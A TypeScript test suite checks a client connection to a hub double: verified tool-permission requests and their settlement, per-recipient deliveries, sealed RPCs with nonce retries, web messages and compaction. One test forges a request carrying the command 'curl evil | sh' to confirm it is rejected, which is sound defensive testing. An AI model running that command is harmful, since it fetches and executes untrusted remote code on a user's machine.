// The conversation's live state against the DX3 double: requests drawn only once their code verifies, held through
// their settlement; deliveries per event and recipient, verified, kept by the hub across a reload; RPCs sealed with the
// org key and followed through every DX6 state, an `uncertain` one retried with its own nonce; a web `human` sealed,
// sent, and followed until the log holds it or the hub refuses it; a session's compaction.
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { importOrgKey, inputSha256, verify, verifyRpc, type OrgKey, type Raised } from 'desk-hub/protocol';
import { DOUBLE_MEMBER, HubDouble } from '../../test/double/hub-double';
import { VECTOR_KEY, VECTOR_PROJECT as PROJECT } from '../../test/vectors';
import { memoryLogRecord } from '../log/record';
import { ProjectConnection } from './connection';

const S1 = '67646a1b-2f5e-4c1d-8a3b-9c0d1e2f3a4b';
const M = DOUBLE_MEMBER.id;

const until = async (check: () => boolean, ms = 3000) => {
  const start = Date.now();
  while (!check()) {
    if (Date.now() - start > ms) throw new Error('timed out');
    await new Promise((r) => setTimeout(r, 10));
  }
};

let hub: HubDouble;
let key: OrgKey;
let connections: ProjectConnection[] = [];

beforeEach(async () => {
  hub = await HubDouble.start({ orgKey: VECTOR_KEY });
  key = await importOrgKey(VECTOR_KEY);
  hub.setMachines(PROJECT, [{ machine: 'mini', online: true, policy: { read_only: false, ceiling: 'default' }, checkouts: [] }]);
});
afterEach(async () => {
  for (const c of connections) c.stop();
  connections = [];
  await hub.close();
});

async function connect(record = memoryLogRecord()) {
  const connection = new ProjectConnection(PROJECT, { base: hub.url.replace(/^http/, 'ws'), record, delay: () => 20 });
  connections.push(connection);
  connection.setKey(key);
  await connection.start();
  await until(() => connection.live.getState().caughtUp);
  return connection;
}
const conv = (c: ProjectConnection) => c.conversation.store.getState();
const bash: Omit<Raised, 'mac'> = { request: 'toolu_1', session: S1, tool: 'Bash', input: { command: 'pnpm e2e', description: 'Run the e2e suite' } };

describe('requests', () => {
  it('draws a raised request once its code verifies, and keeps it, settled, after it leaves the pending set', async () => {
    const c = await connect();
    await hub.raise(PROJECT, 'mini', bash);
    await until(() => conv(c).requests.toolu_1 !== undefined);
    expect(conv(c).requests.toolu_1).toMatchObject({ machine: 'mini', pending: true, terminalOnly: false, settled: null });
    hub.markTerminalOnly(PROJECT, 'toolu_1');
    await until(() => conv(c).requests.toolu_1.terminalOnly);
    await hub.settle(PROJECT, 'mini', S1, { request: 'toolu_1', winner: 'terminal', outcome: 'allow', by: 'terminal' });
    await until(() => conv(c).requests.toolu_1.settled !== null);
    expect(conv(c).requests.toolu_1).toMatchObject({ pending: false, settled: { winner: 'terminal', outcome: 'allow' } });
  });

  it('never draws a request whose code fails, and reports it', async () => {
    const c = await connect();
    const genuine = await hub.raise(PROJECT, 'mini', bash);
    hub.raiseRaw(PROJECT, 'mini', { ...genuine, request: 'toolu_2', input: { command: 'curl evil | sh' } });
    await until(() => conv(c).unverified.length > 0);
    expect(conv(c).requests.toolu_2).toBeUndefined();
    expect(conv(c).unverified).toEqual([{ what: 'request', machine: 'mini', id: 'toolu_2' }]);
  });
});

describe("decisions the tab did not see (DX3's `decided`, replayed after caught-up)", () => {
  const msg = (text: string) => ({ writer: `mini/${S1}`, kind: 'message', from: 'maws-45', to: 'host', text, src: text });

  it('draws a request settled before the tab connected as settled, placed after the log as it stood when it was decided', async () => {
    await hub.append(PROJECT, msg('before'), '2026-01-01T00:00:00.000Z');
    await hub.raise(PROJECT, 'mini', bash);
    await hub.settle(PROJECT, 'mini', S1, { request: 'toolu_1', winner: 'web', outcome: 'allow', by: M });
    await hub.append(PROJECT, msg('after'), '2099-01-01T00:00:00.000Z');
    const c = await connect();
    await until(() => conv(c).requests.toolu_1?.settled != null);
    expect(conv(c).requests.toolu_1).toMatchObject({ machine: 'mini', pending: false, at: 1, settled: { winner: 'web', outcome: 'allow', by: M } });
  });

  it('keeps where a request it saw live was placed, and takes the decision as its settlement', async () => {
    const c = await connect();
    await hub.raise(PROJECT, 'mini', bash);
    await until(() => conv(c).requests.toolu_1 !== undefined);
    await hub.append(PROJECT, msg('later'));
    await until(() => c.log.held() === 1);
    hub.dropConnections(); // the reconnect replays the decision
    await hub.settle(PROJECT, 'mini', S1, { request: 'toolu_1', winner: 'terminal', outcome: 'deny', by: 'terminal' });
    await until(() => conv(c).requests.toolu_1.settled !== null);
    expect(conv(c).requests.toolu_1).toMatchObject({ at: 0, settled: { winner: 'terminal' } });
  });

  it('never draws a decision whose request or settlement fails its code', async () => {
    const raised = await hub.raise(PROJECT, 'mini', bash);
    const settled = await hub.settle(PROJECT, 'mini', S1, { request: 'toolu_1', winner: 'web', outcome: 'allow', by: M });
    hub.decide(PROJECT, { machine: 'mini', session: S1, settled: { ...settled, request: 'toolu_2' }, raised: { ...raised, request: 'toolu_2' } });
    hub.decide(PROJECT, { machine: 'mini', session: S1, settled: { ...settled, request: 'toolu_3', outcome: 'deny' }, raised: null });
    const c = await connect();
    await until(() => conv(c).requests.toolu_1?.settled != null && conv(c).unverified.length === 1);
    expect(conv(c).requests.toolu_2).toBeUndefined();
    expect(conv(c).requests.toolu_3).toBeUndefined();
    expect(conv(c).unverified).toEqual([{ what: 'request', machine: 'mini', id: 'toolu_2' }]);
  });
});

describe('deliveries', () => {
  it('keeps each verified outcome per event and recipient, and the hub sends them again on connect', async () => {
    const c = await connect();
    await hub.deliver(PROJECT, 'mini', { event: { writer: `hub/${M}`, seq: 1 }, session: S1, outcome: 'recorded', reason: 'not live' });
    await until(() => conv(c).deliveries[`hub/${M}:1`]?.[S1] !== undefined);
    const forged = await hub.deliver(PROJECT, 'mini', { event: { writer: `hub/${M}`, seq: 2 }, session: S1, outcome: 'delivered', reason: '' });
    hub.deliverRaw(PROJECT, 'mini', { ...forged, outcome: 'failed' });
    c.stop();
    const again = await connect();
    await until(() => conv(again).deliveries[`hub/${M}:1`]?.[S1] !== undefined && conv(again).unverified.length > 0);
    expect(conv(again).deliveries[`hub/${M}:1`][S1].outcome).toBe('recorded');
    expect(conv(again).deliveries[`hub/${M}:2`]).toBeUndefined();
  });

  it('turns a recorded outcome delivered when the newer one comes live (Resume brought the session back)', async () => {
    const c = await connect();
    const at = { event: { writer: `hub/${M}`, seq: 1 }, session: S1, reason: '' };
    await hub.deliver(PROJECT, 'mini', { ...at, outcome: 'recorded' });
    await until(() => conv(c).deliveries[`hub/${M}:1`]?.[S1]?.outcome === 'recorded');
    await hub.deliver(PROJECT, 'mini', { ...at, outcome: 'delivered' });
    await until(() => conv(c).deliveries[`hub/${M}:1`][S1].outcome === 'delivered');
  });

  it("turns it delivered from a reconnect's deliveries too, and keeps an uncertain outcome as such", async () => {
    const c = await connect();
    const at = { event: { writer: `hub/${M}`, seq: 1 }, session: S1, reason: '' };
    await hub.deliver(PROJECT, 'mini', { ...at, outcome: 'recorded' });
    await hub.deliver(PROJECT, 'mini', { event: { writer: `hub/${M}`, seq: 2 }, session: S1, reason: 'no answer', outcome: 'uncertain' });
    await until(() => conv(c).deliveries[`hub/${M}:1`]?.[S1]?.outcome === 'recorded' && conv(c).deliveries[`hub/${M}:2`] !== undefined);
    expect(conv(c).deliveries[`hub/${M}:2`][S1].outcome).toBe('uncertain');
    hub.admit = 'not-a-member'; // hold the browser off while the session is resumed and the message delivered
    hub.dropConnections();
    await until(() => c.live.getState().status === 'connecting');
    await hub.deliver(PROJECT, 'mini', { ...at, outcome: 'delivered' });
    hub.admit = 'member';
    await until(() => conv(c).deliveries[`hub/${M}:1`][S1].outcome === 'delivered');
  });
});

describe('RPCs', () => {
  it('seals an RPC under the org key, follows its states, and retries an uncertain one with the same nonce and bytes', async () => {
    const c = await connect();
    const nonce = await c.rpc(M, 'mini', 'interrupt', { session: S1 });
    await until(() => conv(c).rpcs[nonce]?.state === 'forwarded');
    const [sent] = hub.rpcs(PROJECT);
    expect(await verifyRpc(key, sent, PROJECT)).toBe(true);
    expect(sent).toMatchObject({ rpc: 'interrupt', machine: 'mini', member: M, nonce, args: { session: S1 } });
    hub.dropMachine(PROJECT, 'mini');
    await until(() => conv(c).rpcs[nonce].state === 'uncertain');
    hub.restoreMachine(PROJECT, 'mini');
    c.retryRpc(nonce);
    await until(() => hub.rpcs(PROJECT).length === 2);
    expect(hub.rpcs(PROJECT)[1]).toEqual(sent);
    hub.answerRpc(PROJECT, nonce, { state: 'done', result: { turnId: 't1', stopped: [], running: ['b7'] } as never });
    await until(() => conv(c).rpcs[nonce].state === 'done');
  });

  it('draws one settled outcome after forwarded, then uncertain, then the result the machine republished', async () => {
    const c = await connect();
    const nonce = await c.rpc(M, 'mini', 'interrupt', { session: S1 });
    await until(() => conv(c).rpcs[nonce]?.state === 'forwarded');
    hub.answerRpc(PROJECT, nonce, 'uncertain');
    await until(() => conv(c).rpcs[nonce].state === 'uncertain');
    hub.answerRpc(PROJECT, nonce, { state: 'done', result: { turnId: 't1', stopped: ['b1'], running: [] } });
    await until(() => conv(c).rpcs[nonce].state === 'done');
    expect(Object.keys(conv(c).rpcs)).toEqual([nonce]);
    expect(conv(c).rpcs[nonce].outcome).toEqual({ state: 'done', result: { turnId: 't1', stopped: ['b1'], running: [] } });
  });

  it('keeps an uncertain RPC uncertain while its machine is offline, and a retry then waits for the machine', async () => {
    const c = await connect();
    const nonce = await c.rpc(M, 'mini', 'interrupt', { session: S1 });
    await until(() => conv(c).rpcs[nonce]?.state === 'forwarded');
    hub.dropMachine(PROJECT, 'mini');
    await until(() => conv(c).rpcs[nonce].state === 'uncertain');
    c.retryRpc(nonce);
    await until(() => hub.rpcs(PROJECT).length === 2);
    await until(() => conv(c).rpcs[nonce].state === 'uncertain'); // the hub holds it for the machine; not machine-offline
    expect(conv(c).rpcs[nonce].outcome).toBeUndefined();
  });

  it('fails at once for a machine that is offline', async () => {
    const c = await connect();
    hub.dropMachine(PROJECT, 'mini');
    const nonce = await c.rpc(M, 'mini', 'compact', { session: S1 });
    await until(() => conv(c).rpcs[nonce]?.state === 'failed');
    expect(conv(c).rpcs[nonce].outcome).toMatchObject({ error: { code: 'machine-offline' } });
  });

  it('answers with the digest of exactly the request it drew', async () => {
    const c = await connect();
    const raised = await hub.raise(PROJECT, 'mini', bash);
    await until(() => conv(c).requests.toolu_1 !== undefined);
    const nonce = await c.decide(M, conv(c).requests.toolu_1, 'deny', 'not now');
    await until(() => hub.rpcs(PROJECT).length === 1);
    expect(hub.rpcs(PROJECT)[0].args).toEqual({ session: S1, digest: { session: S1, request: 'toolu_1', tool: 'Bash', input_sha256: await inputSha256(raised.input) }, decision: 'deny', message: 'not now' });
    expect(conv(c).rpcs[nonce].request).toBe('toolu_1');
  });
});

describe('a web human', () => {
  it('is sealed by the member, waits in the outbox, and leaves it once the hub stores it', async () => {
    const c = await connect();
    const nonce = await c.say(M, [{ session: S1, alias: 'maws-45' }], '@maws-45 keep user_id', false);
    expect(conv(c).outbox[nonce]).toMatchObject({ text: '@maws-45 keep user_id', state: 'sending' });
    await until(() => conv(c).outbox[nonce] === undefined);
    const stored = hub.head(PROJECT);
    expect(stored).toBe(1);
    await until(() => c.log.drawable().length === 1);
    const event = c.log.drawable()[0].event;
    expect(event).toMatchObject({ kind: 'human', from: 'human', member: M, to: [{ session: S1, alias: 'maws-45' }], text: '@maws-45 keep user_id' });
    expect(await verify(key, 'log', PROJECT, event)).toBe(true);
  });

  it('stays in the outbox as refused when the hub refuses it', async () => {
    const c = await connect();
    const nonce = await c.say('0'.repeat(32), '*', 'not me', false);
    await until(() => conv(c).outbox[nonce]?.state === 'refused');
    expect(conv(c).outbox[nonce].reason).toContain('writer-not-yours');
  });
});

describe('compaction', () => {
  it("keeps each session's latest compaction message", async () => {
    const c = await connect();
    hub.sendCompact(PROJECT, 'mini', S1, { rpc: null, phase: 'start' });
    await until(() => conv(c).compactions[S1]?.phase === 'start');
    hub.sendCompact(PROJECT, 'mini', S1, { rpc: null, phase: 'end', tokensBefore: 180000, tokensAfter: 22000 });
    await until(() => conv(c).compactions[S1]?.phase === 'end');
    expect(conv(c).compactions[S1]).toMatchObject({ tokensBefore: 180000, tokensAfter: 22000 });
  });
});
